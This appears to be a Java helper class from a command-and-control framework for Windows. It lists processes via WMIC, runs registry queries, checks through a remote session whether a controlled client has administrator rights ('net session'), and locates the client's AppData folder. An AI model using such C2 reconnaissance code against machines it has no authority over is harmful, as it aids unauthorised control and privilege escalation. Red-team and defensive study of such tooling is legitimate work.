package c2.win;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import c2.session.IOManager;
import util.Time;

public class WindowsCmdLineHelper {
	public static List<String> listRunningProcesses() {
		return runMultilineCmd("WMIC path win32_process get Caption,Processid,Commandline");
	}
	
	public static List<String> runRegistryQuery(String regKey){
		return runMultilineCmd(regKey);
	}
	
	public static List<String> runMultilineCmd(String cmd){
		List<String> processes = new ArrayList<String>();
		try {
			String line;
			Process p = Runtime.getRuntime().exec(cmd);
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((line = input.readLine()) != null) {
				if(line.length() != 0) {
					processes.add(line);
				}
			}
			input.close();
		} catch (Exception err) {
			err.printStackTrace();
		}
		return processes;
	}
	
	public static boolean isClientElevated(int id, IOManager io) {
		io.sendCommand(id, "net session 2>&1");
		String groupListing = io.awaitMultilineCommands(id);
		
		if (groupListing.contains("Access is denied.")) {
			return false;
		} else {
			if(groupListing.contains("There are no entries in the list.") ||
					groupListing.contains("User name")) {
				return true;
			}else {
				groupListing = io.awaitMultilineCommands(id);
				
				if (groupListing.contains("Access is denied.")) {
					return false;
				} else {
					return true;
				}
			}
			
		}
	}
	
	public static String resolveAppData(IOManager io, int sessionId) throws Exception{
		return resolveVariableDirectory(io, sessionId, "%APPDATA%");
	}
	
	public static String resolveVariableDirectory(IOManager io, int sessionId, String variable) throws Exception{
		String queryDirCmd = "dir " + variable;
		io.sendCommand(sessionId, queryDirCmd);
		String dirResponse = io.awaitMultilineCommands(sessionId);
		
		if(dirResponse.contains("File Not Found")) {
			throw new Exception("Undefined variable: " + variable);
		}
		
		String lines[] = dirResponse.split(System.lineSeparator());
		if(lines.length < 4) {
			throw new Exception("Cannot get directory");
		}
		return lines[3].substring(" Directory of ".length());
	}
}
